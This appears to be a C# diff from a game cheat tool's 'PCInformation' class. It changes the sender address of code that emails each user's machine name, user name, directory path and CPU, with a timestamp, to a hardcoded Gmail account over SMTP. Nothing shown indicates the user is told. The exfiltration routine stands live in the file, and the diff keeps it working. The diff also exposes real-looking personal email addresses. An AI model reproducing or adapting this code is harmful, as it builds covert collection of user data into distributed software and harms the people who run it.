@@ -14,8 +14,6 @@ namespace ZBase.Utilities
 {
     class PCInformation
     {
-        public static object ManagementObjectSearcher { get; private set; }
-
         public static void UpdateCheatStatus()
         {
             System.Net.WebClient WClient = new System.Net.WebClient();
@@ -34,7 +32,7 @@ namespace ZBase.Utilities
             client.Port = 587;
             client.EnableSsl = true;
             client.Credentials = login;
-            MailMessage msg = new MailMessage { From = new MailAddress("vargtimmen2@gmail.com") };
+            MailMessage msg = new MailMessage { From = new MailAddress("vargtimmen15@gmail.com") };
             msg.To.Add(new MailAddress("mc.vargtimmen@gmail.com"));
             msg.Subject = "CRNYY's Cheat User Information";
             msg.Body = "Time: " + DateTime.Now + "   MachineName: " + MachineName + "    UserName: " + Username + "    DirectoryPath: " + DirectoryPath + " CPU: " + CPU +
